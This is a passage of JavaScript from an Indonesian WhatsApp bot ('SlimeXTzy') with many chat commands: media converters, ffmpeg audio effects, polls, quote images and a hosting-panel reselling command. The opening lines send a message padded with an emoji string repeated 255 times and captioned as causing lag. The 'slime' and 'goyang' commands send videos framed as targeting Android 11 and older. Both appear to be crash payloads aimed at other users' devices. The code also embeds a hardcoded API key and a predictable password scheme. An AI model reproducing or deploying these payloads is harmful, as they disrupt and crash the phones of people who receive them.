                'title': "YAHAA LAG KASIAN " + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'body': "BY SLIMEXTZY" + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'reviewType': "PHOTO",
                'thumbnail': fs.readFileSync("./baseikal/image/deden.jpeg"),
                'renderLargerThumbnail': false,
                'sourceUrl': "`🔥 WE ARE SLIMEXTZY 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\https://whatsapp.com/channel/0029VaicyTbAjPXOdW7P9f2x",
                'mediaType': 0x1
              }
            }
          }, tilol1);
          await sleep(2000);
          const tilol2 = {
            quoted: batuo
          };
          slime.sendMessage(m.chat, {
            'text': "`🔥 WE ARE SLIMEXTZY 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\https://whatsapp.com/channel/0029VaicyTbAjPXOdW7P9f2x",
            'contextInfo': {
              'externalAdReply': {
                'title': "YAHAA LAG KASIAN " + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'body': "BY SLIMEXTZY" + ('' + "🪓.78/24.```🧙```.*~999999~*.🪄._66/77_._🧚‍♀️_.~_24.*23*/24_~.⛽._18/05_.98-23.~🦧~.~¿~*77/90*.*🐒*.~2/63.~🌗.~*22*-00~.".repeat(255)),
                'reviewType': "PHOTO",
                'thumbnail': fs.readFileSync("./baseikal/image/deden.jpeg"),
                'renderLargerThumbnail': false,
                'sourceUrl': "`🔥 WE ARE SLIMEXTZY 𝑽𝒆𝒏͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍͍𝒐𝒎⃟𑜦͍͢𝑿͍͂៝҃͢͢𝑹𝒆𝒅⃟⃟𝒛𝒊𝒎̃̃̃̃̃̃̃̃̃̃ 😈`\https://whatsapp.com/channel/0029VaicyTbAjPXOdW7P9f2x",
                'mediaType': 0x1
              }
            }
          }, tilol2);
        }
        break;
        


//=================================================//

//=================================================//

//=================================================

//=================================================

//=================================================

//=================================================

//=================================================

//=================================================//

//=================================================//

//=================================================//
case 'slime': {
if (!isCreator) return m.reply('*khusus Premium*')
joauu = fs.readFileSync('./SlimeMedia/video/hwmods.mp4')
slime.sendMessage(from, { video: joauu, mimetype: 'video/mp4', caption: `APA ?? BERANI LIAT VIDEO INI GA ? AH LEMAH TAPI KHUSUS ANDROID 11 KEBAWAH DENG ` }, {quoted:m})
}
break
//=================================================//
case 'goyang': {
if (!isCreator) return m.reply('*khusus Premium*')
joauuuuu = fs.readFileSync('./SlimeMedia/video/hwmods2.mp4')
slime.sendMessage(from, { video: joauuuuu, mimetype: 'video/mp4', caption: `APA ?? BERANI LIAT VIDEO INI GA ? AH LEMAH TAPI KHUSUS ANDROID 11 KEBAWAH DENG ` }, {quoted:m})
}
break
//=================================================

case 'tomp4': case 'tovideo': {
if (!/webp/.test(mime)) return reply(`Reply stiker dengan caption *${prefix + command}*`)
                reply(mess.wait)
                var media = await slime.downloadAndSaveMediaMessage(quoted, new Date * 1)
let webpToMp4 = await webp2mp4File(media)
slime.sendMessage(from, { video: {url: webpToMp4.result}, caption: 'Convert Sticker To Video'}, { quoted: fkontak })
}
break
case "janya": case "toril": case 'toanime': case 'jadianime': {

                if (!quoted) return reply(`Fotonya Mana?`)
                if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
const api = {
    xterm: {
        url: "https://ai.xterm.codes",
        key: "YoriChan"
    }
}; 
                let { key } = await slime.sendMessage(m.chat, { text: mess.wait }, { quoted: m })
                let type = "anime2d"
                if (["jadinyata", "toreal"].includes(command)) {
                    type = "anime2real"
                }
                let tryng = 0
                const media = await slime.downloadAndSaveMediaMessage(quoted)
                let tph = await TelegraPh(media)
                try {
                    let ai = await fetch(api.xterm.url + "/api/img2img/filters?action=" + type + "&url=" + tph + "&key=" + api.xterm.key).then(a => a.json())
                    console.log(ai)
                    if (!ai.status) return reply(ai?.msg || "Error!")
                    while (tryng < 55) {
                        let s = await fetch(api.xterm.url + "/api/img2img/filters/batchProgress?id=" + ai.id).then(a => a.json())
                        await slime.sendMessage(m.chat, { text: s?.progress || "Prepare... ", edit: key }, { quoted: m })
                        if (s.status == 3) {
                            return slime.sendMessage(m.chat, { image: { url: s.url } }, { quoted: m })
                        }
                        if (s.status == 4) {
                            return reply("Maaf terjadi kesalhan. coba gunakan gambar lain!")
                        }
                        await new Promise(resolve => setTimeout(resolve, 5000))
                    }
                } catch (e) {
                    console.error(e)
                    reply(`Type-Err! :\n${e}`)
                }
            }
                break
case 'toptv':{
if (!m.quoted) return reply('```Reply Videonya Untuk Di Jadikan Ptv [!]```')
if(isMedia || q) {
const toptvv = {key: {fromMe: true, participant: `6283897387848@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast"} : {})}, message: {extendedTextMessage: {text: `Powered By SlimexTzy`}}}
var ppt = m.quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({"ptvMessage": ppt, caption: `done banh`, fileLength: 9999999999 }), { userJid: from})
slime.relayMessage(from, ptv.message, { messageId: ptv.key.id })
}
}
break
case 'tovn':{
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply video/audio dengan caption ${prefix + command}`
if (!quoted) throw `Reply video/audio dengan caption ${prefix + command}`
await loading()
var dl = await m.quoted.download()
slime.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: true }, {quoted: m })
}
break
case 'toaudio':{
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply video/audio dengan caption ${prefix + command}`
if (!quoted) throw `Reply video/audio dengan caption ${prefix + command}`
await loading()
var dl = await m.quoted.download()
slime.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: false }, {quoted: m })
}
break
case 'tomp3': {
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply video/audio dengan caption ${prefix + command}`
if (!quoted) throw `Reply video/audio dengan caption ${prefix + command}`
await loading()
var dl = await m.quoted.download()
slime.sendMessage(from, {audio: dl, mimetype:'audio/mpeg', ptt:false, contextInfo:{  externalAdReply: { showAdAttribution: false,
mediaType:  1,
mediaUrl: 'https://youtube.com/@slimedevoloper',
title: `Converter mp3`,
sourceUrl: `${global.saluran}`,
thumbnail: ppnyauser
}
}})
}
break
//=================================================//
case 'togif': {
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./lib/uploader')
let media = await slime.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await slime.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, {quoted:m})
await fs.unlinkSync(media)
}
break
 case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
reply('tunggu sebentar')
let media = await slime.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buff = fs.readFileSync(ran)
slime.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
} catch (e) {
reply(e)
}
break
case  'qcimg':{
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return m.reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
const username = await slime.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await slime.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64")
slime.sendMessage(from,{image: buffer},{quoted : m})
})
}
break
case 'addgc':

    if (!m.isGroup) return reply(mess.group)         

if (!isCreator) return reply(`khusus Creator`)

ntilink.push(m.chat)
        fs.writeFileSync('./database/idgroup.json', JSON.stringify(ntilink))

reply(`${command} sukses`)

           break
case 'delgc':

  if (!isCreator) return reply(`khusus Creator`)

    if (!m.isGroup) return reply(mess.group)

var ini = ntilink.indexOf(m.chat)

ntilink.splice(ini, 1)

fs.writeFileSync('./database/idgruop.json', JSON.stringify(ntilink))

reply(`${command} sukses`)

break

/*
cpanel hapus otomatis, pilih waktu(d), panel akan dihapus jika waktunya sudah habis
cr: SANJAYA
*/



case 'cpanel': {
const penghitung = moment().tz("Asia/Jakarta").format("dddd, D MMMM - YYYY")
    if (!(isCreator || isPrem)) return reply('ᴋʜᴜꜱᴜꜱ ʀᴇꜱᴇʟʟᴇʀ ᴘᴀɴᴇʟ ᴋᴀʟᴏ ᴍᴀᴜ ʙᴜʏ ᴋᴇ wa.me/6283167532721')

    let t = text.split('-');
    let pilihanUkuran = ['1gb', '2gb', '3gb', '4gb', '5gb', '6gb', '7gb', '8gb', '9gb', '10gb', 'unli'];

    if (t.length < 3) {
        let pilihan = pilihanUkuran.map((ukuran, i) => `• ${i + 1}. ${ukuran}`).join('\n');
        return m.reply(`Silakan pilih ukuran disk:\n\n${pilihan}\n\nContoh: ${prefix + command} 1gb-username-nomer-30d`);
    }

    let ukuran = t[0]
    if (!pilihanUkuran.includes(ukuran)) {
        return m.reply(`Ukuran tidak valid! Pilih salah satu dari: ${pilihanUkuran.join(', ')}`);
    }

    let username = t[1];
    let u = m.quoted ? m.quoted.sender : t[2] ? t[2].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    let duration = t[3] ? parseInt(t[3].replace('d', '')) : 30;
    let name = username;
    let egg = global.eggsnya
    if (!duration || isNaN(duration)) return m.reply("Durasi tidak valid! Contoh: 30d");

    let memo = "1024";
    let disk = "1024";
    let cpu = "40"; //cpu 0 = unlimited kalian atur aja sesuka kalian

    switch (ukuran) {
        case '1gb':
            memo = "1024";
            disk = "1024";
            cpu = "40";
            break;
        case '2gb':
            memo = "2048";
            disk = "2048";
            cpu = "60";
            break;
        case '3gb':
            memo = "3072";
            disk = "3072";
            cpu = "80";
            break;
        case '4gb':
            memo = "4096";
            disk = "4096";
            cpu = "100";
            break;
        case '5gb':
            memo = "5120";
            disk = "5120";
            cpu = "120";
            break;
        case '6gb':
            memo = "6144";
            disk = "6144";
            cpu = "140";
            break;
        case '7gb':
            memo = "7168";
            disk = "7168";
            cpu = "160";
            break;
        case '8gb':
            memo = "8192";
            disk = "8192";
            cpu = "180";
            break;
        case '9gb':
            memo = "9216";
            disk = "9216";
            cpu = "220";
            break;
        case '10gb':
            memo = "10240";
            disk = "10240";
            cpu = "300";
            break;
        case 'unli':
            memo = "0";
            disk = "0";
            cpu = "0";
            break;
        default:
            return m.reply(`Ukuran tidak valid! Pilih salah satu dari: ${pilihanUkuran.join(', ')}`);
    }

    let email = username + "@slime.xyz";

    if (!u) return
    let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
    let password = username + "0kUaop!1"
    let deskripsi = `${penghitung}`
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password.toString()
        })
    })
    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2
        }
    })
    m.reply(`_*Wait Sedang Membuat Server Panel . . .*_`)
    let ctf = `*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.username}
* *Ram :* ${memo}
* *Cpu :* ${cpu}%
* *Storage :* ${disk}

    *Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat Pembelian*`
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: ctf
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: ``
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: '',
                        gifPlayback: true,
                        subtitle: '',
                        hasMediaAttachment: false  
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Login Server Panel","url":"${domain}","merchant_url":"https://www.google.com"}`
                            },
                            {
                                "name": "cta_copy",
                                "buttonParamsJson": JSON.stringify({
                                    "display_text": "Copy Username",
                                    "copy_code": `${user.username}`
                                })
                            },
                            {
                                "name": "cta_copy",
                                "buttonParamsJson": JSON.stringify({
                                    "display_text": "Copy Password",
                                    "copy_code": `${password.toString()}`
                                })
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        forwardingScore: 999,
                        isForwarded: false,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '120363325328533494@newsletter',
                            newsletterName: `${wm}`,
                            serverMessageId: 145
                        }
                    }
                })
            }
        }
    }, {quoted: m})
    await slime.relayMessage(u, msg.message, {
        messageId: msg.key.id
    })
    let data2 = await f2.json();
    let startup_cmd = data2.attributes.startup

    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey2,
        },
        "body": JSON.stringify({
            "name": name,
            "description": deskripsi,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo === "Unlimited" ? 0 : memo,
                "swap": 0,
                "disk": disk === "Unlimited" ? 0 : disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 0,
                "backups": 0,
                "allocations": 0
            },
            deploy: {
                locations: [parseInt(global.location)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    })
    let res = await f3.json()
    if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
    let server = res.attributes
    let p = await m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat`)

    setTimeout(async () => {
        let deleteServer = await fetch(`${domain}/api/application/servers/${server.id}`, {
            method: 'DELETE',
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey2
            }
        });
        if (deleteServer.ok) {
            console.log(`Server otomatis dihapus setelah ${duration} hari.`);
        } else {
            console.log("Gagal menghapus server otomatis.");
        }
    }, duration * 30 * 60 * 60 * 1000);
}
break;


case'nuliskiri': {
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} Jayy?`)
await slime.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}
  })   
const tulisan = body.slice(11)
slime.sendMessage(m.chat, {image:{url:`https://api.zeeoneofc.my.id/api/canvas/${command}?apikey=y78GzVZCjtLIVri&text=${q}`}, caption: "Nih dek"}, {quoted: m}).catch(async _ => await m.reply("Apikey Belum Ada"))
}
break
case'nuliskanan': {
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} Jayy?`)
await slime.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
const tulisan = body.slice(12)
slime.sendMessage(m.chat, {image:{url:`https://api.zeeoneofc.my.id/api/canvas/${command}?apikey=y78GzVZCjtLIVri&text=${q}`}, caption: "Nih dek"}, {quoted: m}).catch(async _ => await m.reply("Apikey Belum Ada"))
}
break
case'foliokiri': {
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} Jayy?`)
await slime.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}
  })   
const tulisan = body.slice(11)
slime.sendMessage(m.chat, {image:{url:`https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${q}&apikey=y78GzVZCjtLIVri`}, caption: "Nih dek"}, {quoted: m}).catch(async _ => await m.reply("Apikey Belum Ada"))
}
break
case'foliokanan': {
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} Jayy?`)
await slime.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}
  })   
const tulisan = body.slice(12)
.sendMessage(m.chat, {image:{url:`https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${q}&apikey=y78GzVZCjtLIVri`}, caption: "Nih dek"}, {quoted: m}).catch(async _ => await m.reply("Apikey Belum Ada"))
}
break
case 'puisi': {
const puii = ["Lemari tua itu, masih ada di pojok ruang\nDulu waktu kecil\nAku senang sembunyi di belakangnya\n\nRuangan itu masih menyimpan kenangan\nMeski tak ada lagi kelambu dan lampu sentir\nYang dulu selalu eyang pasang\nMenjelang maghrib\n\nSemua telah tiada\nDitelan waktu\nTapi dalam kenanganku\nSemua segar membayang\nBagai baru usai kemarin\n\nAku termangu di ruang bisu\nAnganku hadir\nAndai aku kembali kecil.", "Biru Bukit, Bukit Kelu\n\nAdalah hujan dalam kabut yang ungu\nTurun sepanjang gunung dan bukit biru\nKetika kota cahaya dan dimana bertemu\nAwan putih yang menghinggapi cemaraku.\n\nAdalah kemarau dalam sengangar berdebu\nTurun sepanjang gunung dan bukit kelu\nKetika kota tak bicara dan terpaku\nGunung api dan hama di ladang-ladangku.\n\nLereng-lereng senja\nPernah menyinar merah kesumba\nPadang ilalang dan bukit membatu\nTanah airku.", "Doa kepada pemeluk teguh\n\nTuhanku\nDalam termangu\nAku masih menyebut namamu\n\nBiar susah sungguh\nmengingat Kau penuh seluruh\ncayaMu panas suci\ntinggal kerdip lilin di kelam sunyi\nTuhanku\naku hilang bentuk remuk\n\nTuhanku\naku mengembara di negeri asing\n\nTuhanku\ndi pintuMu aku mengetuk\naku tidak bisa berpaling", "Sajadah Panjang\n\nAda sajadah panjang terbentang\nDari kaki buaian\nSampai ke tepi kuburan hamba\nKuburan hamba bila mati\n\nAda sajadah panjang terbentang\nHamba tunduk dan sujud\nDi atas sajadah yang panjang ini\nDiselingi sekedar interupsi\n\nMencari rezeki, mencari ilmu\nMengukur jalanan seharian\nBegitu terdengar suara azan\nKembali tersungkur hamba\n\nAda sajadah panjang terbentang\nHamba tunduk dan rukuk\nHamba sujud dan tak lepas kening hamba\nMengingat Dikau Sepenuhnya"]
const siii = puii[Math.floor(Math.random() * puii.length)]
slime.sendMessage(m.chat, {text: `${siii}` }, {quoted: m})
}
break
case 'cekmem': 
case 'cekmember': {
if (!m.isGroup) return m.reply('Fitur Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
let kntl = `CEK MEMBER *${groupName}*\n• ${groupMetadata.participants.length} Member group!`
m.reply(kntl)
}
break
case 'pol':
case 'poll': 
case 'poling': 
case 'polling': {
function checkDuplicate(arr) {
    return new Set(arr).size !== arr.length
}
    let a = q.split("|").slice(1)
    if (!a[1] && !q) return m.reply(`*Contoh :*\n${prefix+command} Setuju gak |Setuju|Gak`)
    if (a[12]) return m.reply('Kebanyakan pilihan, Format\n' + prefix + command + 'Jayy kull? |Iya Lah|Gak')
    if (checkDuplicate(a)) return m.reply('Pilihan polling nya ada yang sama dek :v')
    let nama = await slime.getName(m.sender)
    let b = text.split('|')
    let cap = `Polling For *${groupName}*\n\n*Nama :* ${nama}\n*Pesan :* ${text.split('|')[0]}`

    const pollMessage = {
        name: cap,
        values: a,
        multiselect: false,
        selectableCount: 1
    }
    await slime.sendMessage(m.chat, {
        poll: pollMessage
    })
}
break
case 'clearall': {
if (!isCreator) return m.reply('Fitur Khusus Owner!')
slime.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
case 'renungan': 
case 'quotesrenungan':
case 'qrenungan': {
const renung = [
"https://telegra.ph/file/f52f8d6312f3ac2590727.jpg", 
"https://telegra.ph/file/35cb9decc525a3453ba87.jpg",
"https://telegra.ph/file/5996566cb5cd615f60f51.jpg",
"https://telegra.ph/file/87ecb0f385ae390c609e8.jpg",
"https://telegra.ph/file/7ca48dd2329937b7f86da.jpg", 
"https://telegra.ph/file/e2d603fa0ec9004ca9e2f.jpg",
"https://telegra.ph/file/f8f9ac3d38c9e3c9456ec.jpg",
"https://telegra.ph/file/9e1f626f4005b6f16d904.jpg",
"https://telegra.ph/file/6300478b6ffdf0c0001e9.jpg",
"https://telegra.ph/file/dca222749fb98ce0384f7.jpg",
"https://telegra.ph/file/295f6f6164794a2156d2e.jpg",
"https://telegra.ph/file/429cb39112f2870327398.jpg",
"https://telegra.ph/file/9d96d5fcc89c6f30e086f.jpg",
"https://telegra.ph/file/c396c9da3800536792139.jpg",
"https://telegra.ph/file/6d2fc9ac5c878fa93c43f.jpg",
"https://telegra.ph/file/09174bfbe94a756a90411.jpg",
"https://telegra.ph/file/2dcd363e5f9eb42d88cc0.jpg",
"https://telegra.ph/file/798daf4f7a87bbabc8694.jpg",
"https://telegra.ph/file/4052c388390385d9c79f3.jpg", 
"https://telegra.ph/file/d8f1a14f712d6a860b36c.jpg",
"https://telegra.ph/file/eed16ec2df3cc22102e7b.jpg",
"https://telegra.ph/file/0738833300f1620285b36.jpg",
"https://telegra.ph/file/dc464f93b5a579c279979.jpg",
"https://telegra.ph/file/0e0aa4e97675b2e649ddc.jpg",
"https://telegra.ph/file/2b58e9e63b38ac837e8cd.jpg",
"https://telegra.ph/file/49029a0e94ee5d710b6a9.jpg",
"https://telegra.ph/file/3a1ecc7774208670ec781.jpg",
"https://telegra.ph/file/46a125a6a3dc13cee931e.jpg",
"https://telegra.ph/file/37c358438489180b48723.jpg",
"https://telegra.ph/file/6287bc3f9b7876aeb5554.jpg",
"https://telegra.ph/file/684f268210c2de5d44bc6.jpg",
"https://telegra.ph/file/166b0d7fd1fcc55a09449.jpg",
"https://telegra.ph/file/f6713bdd595530bb38df9.jpg",
"https://telegra.ph/file/6738bff78091aa85a6cd7.jpg",
"https://telegra.ph/file/370d394c23fd162c6c9be.jpg",
"https://telegra.ph/file/38f2ceb0daf966fe7ddcf.jpg",
"https://telegra.ph/file/d23c4cedab7bf64915ba2.jpg",
"https://telegra.ph/file/3e72698c996538ee50ccf.jpg",
"https://telegra.ph/file/0379370add3bbae122008.jpg",
"https://telegra.ph/file/873d1b18acf16088786ca.jpg",
"https://telegra.ph/file/823e0664c7edec135b847.jpg",
"https://telegra.ph/file/8c8da910ab52c7a2b7ccf.jpg",
"https://telegra.ph/file/8037b52b84e8c39060f89.jpg",
"https://telegra.ph/file/e6da062c873aca03d25d4.jpg",
"https://telegra.ph/file/ef307b95c45e77defd0e1.jpg",
"https://telegra.ph/file/d66123bde1e967adf72b9.jpg",
"https://telegra.ph/file/7a2a376d1d152d382ae1a.jpg",
"https://telegra.ph/file/f8d0253bb97ea30e04275.jpg",
"https://telegra.ph/file/bbe65705f8dc9558eb177.jpg",
"https://telegra.ph/file/c7530031da08b4441ee9f.jpg",
"https://telegra.ph/file/5c1f7320f1b457911c3c2.jpg",
"https://telegra.ph/file/5a8600f4651e9497f6562.jpg",
"https://telegra.ph/file/053032e59ced4dac9ed3d.jpg",
"https://telegra.ph/file/ef61d077b685d47a11ff0.jpg",
"https://telegra.ph/file/c8a5cc9b9da57299a1f25.jpg",
"https://telegra.ph/file/2ed057545501fc3bc8de0.jpg",
"https://telegra.ph/file/b3b7c0c22e7dba04cab03.jpg",
"https://telegra.ph/file/62579a62376550e6590b1.jpg",
"https://telegra.ph/file/d140b0791799af2f67315.jpg",
"https://telegra.ph/file/81fd213f74b1235ef18fc.jpg",
"https://telegra.ph/file/d00db1507843f4ead46d8.jpg",
"https://telegra.ph/file/dedfa2294f4eb845acac4.jpg",
"https://telegra.ph/file/2b3700178b39c9c01e9b4.jpg",
"https://telegra.ph/file/a7be3d06c7dd9b8475579.jpg",
"https://telegra.ph/file/f7d91295ec35c44af8c90.jpg",
"https://telegra.ph/file/01e42d9181311dd7d2d70.jpg",
"https://telegra.ph/file/e5cf6db288acbfbb13f2b.jpg",
"https://telegra.ph/file/5a6ee797141b96fcebcce.jpg",
"https://telegra.ph/file/88d5b22d7a40365f59fc4.jpg",
"https://telegra.ph/file/0de4de20e35f6c9b12af6.jpg",
"https://telegra.ph/file/6b60a05a32e7bdbb62c2d.jpg",
"https://telegra.ph/file/549e5a1dbd0aebbd909c6.jpg",
"https://telegra.ph/file/d9d0c658ef1ea088d3579.jpg",
"https://telegra.ph/file/4c8fa9809897b7bd3eb03.jpg",
"https://telegra.ph/file/a58ee2c51fdc6c78ed7f6.jpg",
"https://telegra.ph/file/f2253a885cb84af5d588c.jpg",
"https://telegra.ph/file/f17bd255b176da6943240.jpg",
"https://telegra.ph/file/279afb02b1fcf93abdae4.jpg",
"https://telegra.ph/file/8ba4a8f31cf0673f6aa87.jpg",
"https://telegra.ph/file/c842818563065460b022e.jpg",
"https://telegra.ph/file/99e10142aeef70961437a.jpg",
"https://telegra.ph/file/33da8321603f78cd165f4.jpg",
"https://telegra.ph/file/63678732998176b22fa96.jpg",
"https://telegra.ph/file/b79bb874be90a34cd5786.jpg",
"https://telegra.ph/file/148875b883f91ac8b42e6.jpg",
"https://telegra.ph/file/275d948e0ed99652b4c52.jpg",
"https://telegra.ph/file/dbfa4e1043d1bbc9441b2.jpg",
"https://telegra.ph/file/1ab030093aea5937e0468.jpg",
"https://telegra.ph/file/b5b64e5e5ee0df73bc5b5.jpg",
"https://telegra.ph/file/a7032cdd783d8f1656424.jpg",
"https://telegra.ph/file/5ea4218fedab8e124496b.jpg",
"https://telegra.ph/file/0e0fef10d278f886a5f4a.jpg",
"https://telegra.ph/file/09e81d73081d6f2811ca3.jpg",
"https://telegra.ph/file/816866bef7a307029e6b6.jpg",
"https://telegra.ph/file/5b5736027ae57a787d00c.jpg",
"https://telegra.ph/file/68899ab649fa4711905ce.jpg",
"https://telegra.ph/file/47b0c825cdf8ebaa90a05.jpg",
"https://telegra.ph/file/06aaa229521191de3895e.jpg",
"https://telegra.ph/file/68551e562c4e343efd965.jpg",
"https://telegra.ph/file/9487c11c728cd279b8da3.jpg"
]
const renunganx = renung[Math.floor(Math.random() * renung.length)]
slime.sendMessage(m.chat, {image: {url: renunganx}, caption: '_Renungan_'}, {quoted: m})
}
break
case 'timergc': {
if (!m.isGroup) return m.reply('Fitur Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
if (!isAdmins && !isCreator) return m.reply('Fitur Khusus Admin group!')
if (!isBotAdmins) return m.reply('Saya Bukan Admin group!')
